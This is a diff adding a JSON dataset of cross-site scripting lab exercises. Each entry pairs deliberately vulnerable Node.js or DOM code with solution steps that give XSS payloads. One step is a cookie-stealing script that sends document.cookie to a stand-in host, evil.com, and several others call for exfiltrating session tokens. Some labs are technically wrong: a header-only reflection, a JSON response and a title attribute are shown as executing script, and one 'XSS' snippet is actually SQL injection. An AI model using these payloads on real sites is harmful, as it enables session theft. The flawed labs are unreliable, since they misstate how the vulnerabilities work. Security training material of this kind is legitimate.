@@ -1,0 +1,282 @@
+[
+  {
+    "Lab scenario": "DOM XSS in WebSocket message handling",
+    "Lab Description": "This lab contains a DOM-based cross-site scripting vulnerability in a WebSocket-based chat application. The application dynamically updates messages without proper sanitization, allowing attackers to inject malicious scripts. To solve: Inject an XSS payload via WebSocket and execute JavaScript in the victim's browser.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1. Intercept WebSocket messages using Burp Suite.",
+      "2. Inject the following payload: <img src=x onerror=alert(document.domain)>",
+      "3. Observe the message rendering in the victim's chat window.",
+      "4. Verify script execution in the victim's browser.",
+      "5. Exfiltrate sensitive information using document.cookie."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "const WebSocket = require('ws');\nconst wss = new WebSocket.Server({ port: 8080 });\n\nwss.on('connection', ws => {\n  ws.on('message', message => {\n    wss.clients.forEach(client => {\n      if (client.readyState === WebSocket.OPEN) {\n        client.send(`<p>${message}</p>`);\n      }\n    });\n  });\n});"
+  },
+  {
+    "Lab scenario": "Stored XSS in CMS user profile",
+    "Lab Description": "This lab contains a stored cross-site scripting vulnerability in a CMS profile update feature. The application does not properly escape user input before rendering it on the dashboard. To solve: Inject a persistent XSS payload in the profile description and trigger script execution for other users.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "1. Register an account and navigate to the profile edit page.",
+      "2. Inject the payload <script>fetch('http://evil.com?c='+document.cookie)</script> in the bio field.",
+      "3. Save the profile and log out.",
+      "4. Wait for an administrator to view the profile, triggering script execution.",
+      "5. Capture administrator session cookies."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "app.post('/update-profile', (req, res) => {\n  let { bio } = req.body;\n  database.updateUserProfile(req.user.id, `<p>${bio}</p>`);\n  res.redirect('/dashboard');\n});"
+  },
+  {
+    "Lab scenario": "Reflected XSS via HTTP header manipulation",
+    "Lab Description": "This lab contains a reflected XSS vulnerability in an HTTP response header. The application echoes back user-supplied data without encoding it properly. To solve: Inject a JavaScript payload in a request header and execute an alert().",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1. Intercept a GET request using Burp Suite.",
+      "2. Modify the User-Agent header to include: \"<script>alert('XSS')</script>\".",
+      "3. Observe script execution in the server response.",
+      "4. Identify additional injection points for privilege escalation.",
+      "5. Bypass security filters using event-based XSS techniques."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "app.get('/profile', (req, res) => {\n  res.setHeader('X-User-Info', req.headers['user-agent']);\n  res.send('<h1>Welcome!</h1>');\n});"
+  },
+  {
+    "Lab scenario": "Mutation XSS via DOM property injection",
+    "Lab Description": "This lab demonstrates a mutation-based XSS vulnerability. The application modifies DOM properties dynamically based on user input. To solve: Inject an XSS payload that mutates into an executable script after DOM manipulation.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "1. Locate a dynamic element on the page using DevTools.",
+      "2. Inject a payload like: \"javascript:alert(1)\" into an editable field.",
+      "3. Observe how the application mutates input into an event handler.",
+      "4. Confirm successful execution after mutation.",
+      "5. Extend the attack to steal authentication tokens."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "document.querySelector('#user-input').addEventListener('input', (e) => {\n  document.querySelector('#preview').innerHTML = `<a href='${e.target.value}'>Click</a>`;\n});"
+  },
+  {
+    "Lab scenario": "Stored XSS via SVG file upload",
+    "Lab Description": "This lab contains a stored XSS vulnerability via an SVG file upload feature. The application fails to sanitize embedded JavaScript inside SVG images. To solve: Upload a malicious SVG file containing an XSS payload and trigger script execution when an administrator views it.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "1. Create a malicious SVG file containing <script>alert(1)</script>.",
+      "2. Upload the file to the application using the file manager.",
+      "3. Wait for an administrator to open the file.",
+      "4. Observe JavaScript execution in their session.",
+      "5. Exploit the vulnerability to steal session tokens."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "app.post('/upload', (req, res) => {\n  let file = req.files.svg;\n  file.mv('./uploads/' + file.name, () => {\n    res.send('File uploaded!');\n  });\n});"
+  },
+  {
+    "Lab scenario": "DOM XSS via dynamically generated iframe src attribute",
+    "Lab Description": "This lab contains a DOM-based XSS vulnerability in an iframe source attribute assignment. The application sets the iframe src dynamically based on user input without sanitization. To solve: Inject an XSS payload in the URL parameter to execute JavaScript inside the iframe.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1. Access the vulnerable endpoint with a crafted URL.",
+      "2. Inject the payload: javascript:alert(document.domain)",
+      "3. Observe the iframe loading the JavaScript payload.",
+      "4. Extend the attack to exfiltrate sensitive data.",
+      "5. Implement a bypass using encoded URI schemes."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "document.getElementById('iframe').src = new URLSearchParams(window.location.search).get('page');"
+  },
+  {
+    "Lab scenario": "Stored XSS in comment section with Markdown processing",
+    "Lab Description": "This lab contains a stored XSS vulnerability due to improper sanitization in a Markdown-based comment system. The application incorrectly allows JavaScript execution within user-submitted comments. To solve: Submit a crafted Markdown payload that executes JavaScript when rendered.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "1. Register an account and navigate to the comment section.",
+      "2. Post the payload: [Click me](javascript:alert(1))",
+      "3. Reload the page and observe JavaScript execution.",
+      "4. Exploit the vulnerability to steal authentication tokens.",
+      "5. Implement a payload that persists across multiple views."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "app.post('/comment', (req, res) => {\n  database.saveComment(req.body.comment);\n  res.redirect('/post');\n});"
+  },
+  {
+    "Lab scenario": "Reflected XSS via vulnerable JSON endpoint",
+    "Lab Description": "This lab contains a reflected XSS vulnerability in a JSON API response. The application returns user input directly in the response without encoding. To solve: Inject an XSS payload in a query parameter and execute JavaScript when parsing the JSON response.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1. Send a request with an XSS payload via a query parameter.",
+      "2. Inject: \"<script>alert(1)</script>\" into the 'name' parameter.",
+      "3. Observe JavaScript execution in the browser console.",
+      "4. Escalate the attack by chaining multiple payloads.",
+      "5. Exfiltrate session cookies using an obfuscated payload."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "app.get('/api/user', (req, res) => {\n  res.json({ message: `Hello, ${req.query.name}` });\n});"
+  },
+  {
+    "Lab scenario": "Mutation XSS via attribute-based event handler injection",
+    "Lab Description": "This lab demonstrates a mutation-based XSS vulnerability where user input is inserted into an attribute, mutating into an event handler. The application improperly handles attribute-based user input, allowing execution of JavaScript. To solve: Inject an XSS payload that mutates and executes JavaScript after DOM modification.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "1. Identify a form input field that dynamically updates an element's attribute.",
+      "2. Inject payload: \"onmouseover=alert(1)\" into the input field.",
+      "3. Observe how the application mutates input into an event handler.",
+      "4. Trigger the payload by interacting with the element.",
+      "5. Bypass filters using encoded attribute payloads."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "document.getElementById('output').setAttribute('title', userInput);"
+  },
+  {
+    "Lab scenario": "Stored XSS via JSON Web Token (JWT) payload",
+    "Lab Description": "This lab contains a stored XSS vulnerability where an attacker can inject malicious JavaScript into a JWT payload. The application decodes and reflects the JWT payload in an admin dashboard without proper sanitization. To solve: Modify the JWT payload to include a stored XSS attack.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "1. Capture and decode a JWT token using jwt.io.",
+      "2. Modify the 'username' field to: \"<script>alert(1)</script>\".",
+      "3. Re-sign the JWT using a weak secret key.",
+      "4. Send the modified JWT to the application.",
+      "5. Observe JavaScript execution in the admin dashboard."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "app.post('/verify-token', (req, res) => {\n  let decoded = jwt.verify(req.body.token, 'weaksecret');\n  res.send(`<h1>Welcome ${decoded.username}</h1>`);\n});"
+  },
+  {
+    "Lab scenario": "Stored XSS in user profile bio field",
+    "Lab Description": "This lab contains a stored XSS vulnerability in the user profile bio field. The application allows users to enter bio descriptions, which are displayed on their profile pages without proper sanitization. To solve: Inject a malicious script that executes whenever another user views the profile.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1. Register a user account and navigate to the profile update section.",
+      "2. Enter the payload <script>alert('XSS')</script> in the bio field.",
+      "3. Save changes and log out.",
+      "4. Log in as another user and visit the attacker’s profile.",
+      "5. Observe the XSS execution."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "app.post('/update-bio', (req, res) => {\n  let bio = req.body.bio;\n  db.query(`UPDATE users SET bio='${bio}' WHERE id=${req.user.id}`);\n  res.send('Bio updated');\n});"
+  },
+  {
+    "Lab scenario": "DOM-based XSS in dynamic comment rendering",
+    "Lab Description": "This lab contains a DOM-based XSS vulnerability in a comment rendering feature. The application updates comments dynamically in the DOM using innerHTML without proper sanitization. To solve: Inject JavaScript code that executes in another user's browser when they load comments.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "1. Post a comment containing the payload: <img src=x onerror=alert('XSS')>",
+      "2. Refresh the page and observe script execution.",
+      "3. Test additional payloads for event-based execution.",
+      "4. Verify if the attack works across multiple users.",
+      "5. Develop a more sophisticated payload to exfiltrate session cookies."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "document.getElementById('comments').innerHTML += `<p>${userComment}</p>`;"
+  },
+  {
+    "Lab scenario": "Mutation-based XSS via event handlers in chat application",
+    "Lab Description": "This lab contains a mutation-based XSS vulnerability where user-generated content is manipulated by client-side scripts. The application modifies chat messages, allowing attackers to inject event-based malicious scripts. To solve: Exploit DOM mutation to inject an XSS payload.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "1. Send a crafted message containing <a href='#' onclick='alert(1)'>Click me</a>.",
+      "2. Observe how the message is processed by the application.",
+      "3. Modify the payload to include additional event handlers like onmouseover.",
+      "4. Trigger execution upon DOM modification.",
+      "5. Verify persistence and payload execution on multiple users."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "document.getElementById('chatbox').innerHTML += `<div>${message}</div>`;"
+  },
+  {
+    "Lab scenario": "Reflected XSS in search query results",
+    "Lab Description": "This lab contains a reflected XSS vulnerability in the search functionality. The application dynamically displays user input without proper encoding. To solve: Craft a malicious search query that triggers JavaScript execution in the user's browser.",
+    "Difficulty Level": "Easy",
+    "Solution Steps": [
+      "1. Enter <script>alert('XSS')</script> in the search bar.",
+      "2. Click the search button.",
+      "3. Observe script execution in the response.",
+      "4. Experiment with different payloads for bypassing security mechanisms.",
+      "5. Implement URL encoding techniques for deeper exploitation."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "app.get('/search', (req, res) => {\n  let query = req.query.q;\n  res.send(`<h2>Results for: ${query}</h2>`);\n});"
+  },
+  {
+    "Lab scenario": "XSS via WebSocket message injection",
+    "Lab Description": "This lab contains an XSS vulnerability in a WebSocket-based messaging system. The application broadcasts user messages to all connected clients without validation. To solve: Inject a malicious payload into the WebSocket message stream to trigger execution.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1. Open the WebSocket connection and send: {\"message\": \"<script>alert('XSS')</script>\"}.",
+      "2. Observe message reflection in all connected clients.",
+      "3. Modify payloads to target specific user roles.",
+      "4. Test for persistence by checking message storage mechanisms.",
+      "5. Use advanced payloads to exfiltrate sensitive data."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "ws.on('message', msg => {\n  document.getElementById('messages').innerHTML += `<p>${msg}</p>`;\n});"
+  },
+  {
+    "Lab scenario": "Stored XSS in product review section",
+    "Lab Description": "This lab contains a stored XSS vulnerability in the product review section. The application allows users to submit reviews, which are displayed on product pages without proper sanitization. To solve: Inject a malicious script that executes whenever another user views the product review.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1. Submit a product review containing: <script>alert('XSS')</script>",
+      "2. Refresh the product page.",
+      "3. Observe the execution of the payload.",
+      "4. Test additional payloads for filter evasion.",
+      "5. Verify persistence across different user sessions."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "app.post('/submit-review', (req, res) => {\n  let review = req.body.review;\n  db.query(`INSERT INTO reviews (content) VALUES ('${review}')`);\n  res.send('Review submitted');\n});"
+  },
+  {
+    "Lab scenario": "DOM-based XSS in real-time notifications",
+    "Lab Description": "This lab contains a DOM-based XSS vulnerability in the real-time notifications feature. Notifications are inserted into the DOM dynamically using innerHTML without proper sanitization. To solve: Inject a script that executes when another user receives a notification.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "1. Trigger a notification with: <img src=x onerror=alert('XSS')>",
+      "2. Observe how the application processes the input.",
+      "3. Experiment with different payloads for persistence.",
+      "4. Validate execution across multiple user roles.",
+      "5. Modify payload to extract user session tokens."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "document.getElementById('notifications').innerHTML += `<div>${notificationMessage}</div>`;"
+  },
+  {
+    "Lab scenario": "Reflected XSS in feedback form submission",
+    "Lab Description": "This lab contains a reflected XSS vulnerability in the feedback submission form. The application includes user input in the response page without proper encoding. To solve: Inject a script that executes when the form submission result is displayed.",
+    "Difficulty Level": "Easy",
+    "Solution Steps": [
+      "1. Enter <script>alert('XSS')</script> in the feedback form.",
+      "2. Submit the form.",
+      "3. Observe script execution in the response page.",
+      "4. Test alternative payloads for bypassing filtering mechanisms.",
+      "5. Identify potential encoding tricks for deeper exploitation."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "app.get('/submit-feedback', (req, res) => {\n  let feedback = req.query.feedback;\n  res.send(`<p>Your feedback: ${feedback}</p>`);\n});"
+  },
+  {
+    "Lab scenario": "XSS via manipulated URL parameters in image preview",
+    "Lab Description": "This lab contains an XSS vulnerability in an image preview feature where the image URL is taken directly from a URL parameter and displayed without sanitization. To solve: Inject a payload that triggers JavaScript execution when an image is loaded.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1. Construct a malicious URL: /preview?img=<script>alert('XSS')</script>",
+      "2. Open the crafted URL in the browser.",
+      "3. Observe JavaScript execution.",
+      "4. Test alternative payloads for bypass techniques.",
+      "5. Verify execution across different browser contexts."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "app.get('/preview', (req, res) => {\n  let img = req.query.img;\n  res.send(`<img src='${img}'>`);\n});"
+  },
+  {
+    "Lab scenario": "XSS via injected script in WebSocket chat application",
+    "Lab Description": "This lab contains an XSS vulnerability in a WebSocket-based chat application where user messages are broadcast to all connected clients without validation. To solve: Inject a malicious script that executes when another user receives the message.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "1. Send a message containing: <script>alert('XSS')</script>",
+      "2. Observe message reflection in all connected clients.",
+      "3. Modify payloads to execute under different conditions.",
+      "4. Test for persistence by checking message storage.",
+      "5. Exploit the vulnerability to exfiltrate user data."
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "srcCode": "ws.on('message', msg => {\n  document.getElementById('chatbox').innerHTML += `<p>${msg}</p>`;\n});"
+  }
+]
